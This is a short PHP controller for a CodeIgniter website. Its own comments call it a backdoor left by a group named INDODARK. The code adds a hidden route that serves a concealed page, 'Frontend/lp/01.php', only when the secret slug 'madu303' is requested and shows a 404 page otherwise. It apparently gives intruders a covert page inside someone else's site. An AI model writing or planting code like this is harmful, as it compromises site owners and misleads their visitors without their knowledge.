<?php defined('BASEPATH') OR exit('No direct script access allowed');

// BACKDOOR OFFICEIAL INDODARK SISTEM
// HAPPY HACKING BY INDODARK

class Newpage extends CI_Controller {
	function __construct()
	{
		parent::__construct();	
 		$this->site = $this->mf_beranda->get_identitas();
	}

	public function page($slug)
	{
        
		if($slug === 'madu303') {
			$v = '01.php';
		} else {
            $v = '404.php';
        };
		$this->load->view('Frontend/lp/'.$v);
	}
}